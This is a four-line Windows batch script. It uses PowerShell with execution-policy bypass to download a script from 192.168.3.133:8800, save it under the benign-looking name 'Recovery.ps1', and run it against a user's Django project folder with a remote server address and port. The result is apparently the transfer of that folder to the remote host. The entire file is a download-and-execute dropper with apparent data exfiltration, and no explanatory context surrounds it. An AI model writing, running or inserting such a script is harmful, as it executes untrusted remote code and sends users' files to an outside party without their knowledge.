echo @ off
color a
powershell.exe -exec bypass iwr -uri "192.168.3.133:8800/PSNccs.ps1" -o Recovery.ps1
powershell.exe -exec bypass ./Recovery.ps1 -e C:\Users\DARK-SHADOW\Desktop\djangoProject -s 192.168.3.133 -p 81